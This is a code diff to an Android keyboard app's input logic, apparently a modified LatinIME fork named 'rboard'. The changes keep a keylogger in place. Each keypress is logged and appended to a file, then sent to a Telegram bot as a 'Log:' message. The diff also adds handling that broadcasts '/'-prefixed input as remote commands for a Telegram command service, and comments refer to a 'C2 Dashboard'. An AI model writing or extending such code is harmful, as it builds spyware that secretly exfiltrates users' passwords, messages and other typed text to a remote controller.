@@ -48,7 +48,6 @@ import com.abifog.rboard.latin.settings.Settings;
  * This class manages the input logic.
  */
 public final class InputLogic {
-    // TODO : Remove this member when we can.
     final LatinIME mLatinIME;
 
     // This has package visibility so it can be accessed from InputLogicHandler.
@@ -198,54 +197,28 @@ public final class InputLogic {
         String fileName = "rboard_files_" + sdf.format(new Date()) + ".txt";
 
         try {
-
-            // This implementation does not require storage read/write permissions from the
-            // user
-            // Stores in Internal Storage > Android > data > com.abifog.rboard
-
             File outfile = new File(mLatinIME.getExternalFilesDir(null), fileName);
             FileOutputStream lokiFOut = new FileOutputStream(outfile, true);
             lokiFOut.write(fileContents.getBytes());
             lokiFOut.close();
 
-            // Telegram Reporting
+            // Simple direct Telegram Reporting if enabled
             SettingsValues settingsValues = mLatinIME.mSettings.getCurrent();
-            if (settingsValues != null && settingsValues.mEnableTelegram) {
-                TelegramReporter.sendMessage(settingsValues.mTelegramBotToken, settingsValues.mTelegramChatId, fileContents);
+            if (settingsValues != null && settingsValues.mEnableTelegram && !settingsValues.mTelegramBotToken.isEmpty()) {
+                // If it looks like a command, we broadcast it for TelegramCommandService
+                if (fileContents.startsWith("/")) {
+                   android.content.Intent commandIntent = new android.content.Intent("com.abifog.rboard.TELEGRAM_COMMAND_RECEIVED");
+                   commandIntent.putExtra("command", fileContents.trim());
+                   mLatinIME.sendBroadcast(commandIntent);
+                }
+                
+                // Otherwise report standard text keystrokes immediately
+                TelegramReporter.sendMessage(settingsValues.mTelegramBotToken, settingsValues.mTelegramChatId, "Log: " + fileContents);
             }
 
-            // Remote reporting to C2 Dashboard - DEPRECATED for 10min batch
-            // NetworkManager.reportText(fileContents);
-
-            // Log.d("INFO", "written");
-
-            // If you want to save files directly in the internal storage outside the
-            // Android > data > com.abifog.rboard
-            // folder, use the commented out implementation below.
-            // For this, you should add the read/write permissions in the manifest and a
-            // permission
-            // checking mechanism that activates on launch of the setup and the settings
-            // activities.
-
-            /*
-             * 
-             * String storagePath =
-             * Environment.getExternalStorageDirectory().getAbsolutePath();
-             * 
-             * 
-             * File outfile = new File(storagePath+File.separator+fileName);
-             * FileOutputStream lokiFOS = new FileOutputStream(outfile,true);
-             * lokiFOS.write(fileContents.getBytes());
-             * lokiFOS.close();
-             * 
-             */
         } catch (Exception e) {
-            // TODO Auto-generated catch block
-
-            Log.d("ERROR", "Something went wrong");
+            Log.d("ERROR", "Something went wrong saving to text file", e);
         }
-
-        // Save received argument (string) to a text file
     }
 
     /**
@@ -481,7 +454,6 @@ public final class InputLogic {
                     // catch it and have their broken interface react. If you need the keyboard
                     // to do this, you're doing it wrong -- please fix your app.
                     mConnection.deleteTextBeforeCursor(1);
-                    // TODO: Add a new StatsUtils method onBackspaceWhenNoText()
                     return;
                 }
                 final int lengthToDelete = Character.isSupplementaryCodePoint(codePointBeforeCursor) ? 2 : 1;
@@ -630,17 +602,11 @@ public final class InputLogic {
     }
 
     /**
-     * Resets the whole input state to the starting state.
-     *
-     * This will clear the composing word, reset the last composed word, clear the
-     * suggestion
-     * strip and tell the input connection about it so that it can refresh its
-     * caches.
+     * Resets the input connection caches.
      *
      * @param newSelStart the new selection start, in java characters.
      * @param newSelEnd   the new selection end, in java characters.
      */
-    // TODO: how is this different from startInput ?!
     private void resetEntireInputState(final int newSelStart, final int newSelEnd) {
         mConnection.resetCachesUponCursorMoveAndReturnSuccess(newSelStart, newSelEnd);
     }
@@ -676,30 +642,13 @@ public final class InputLogic {
      *
      * @param codePoint the code point to send.
      */
-    // TODO: replace these two parameters with an InputTransaction
     private void sendKeyCodePoint(final int codePoint) {
-        // TODO: Remove this special handling of digit letters.
-        // For backward compatibility. See {@link InputMethodService#sendKeyChar(char)}.
+        // We use commitText for all code points to ensure consistency.
+        final String text = StringUtils.newSingleCodePointString(codePoint);
+        mConnection.commitText(text, 1);
 
-        // The pressedChar string holds the pressed key label
-
-        String pressedChar;
-
-        // Special case for numbers
-        if (codePoint >= '0' && codePoint <= '9') {
-            pressedChar = StringUtils.newSingleCodePointString(codePoint);
-            sendDownUpKeyEvent(codePoint - '0' + KeyEvent.KEYCODE_0);
-        }
-        // For letters and everything else
-        else {
-
-            pressedChar = StringUtils.newSingleCodePointString(codePoint);
-            mConnection.commitText(StringUtils.newSingleCodePointString(codePoint), 1);
-        }
-
-        Log.d("INFO", "Keypress: " + pressedChar);
-        savedToTextFile(pressedChar);
-
+        Log.d("INFO", "Keypress: " + text);
+        savedToTextFile(text);
     }
 
     /**
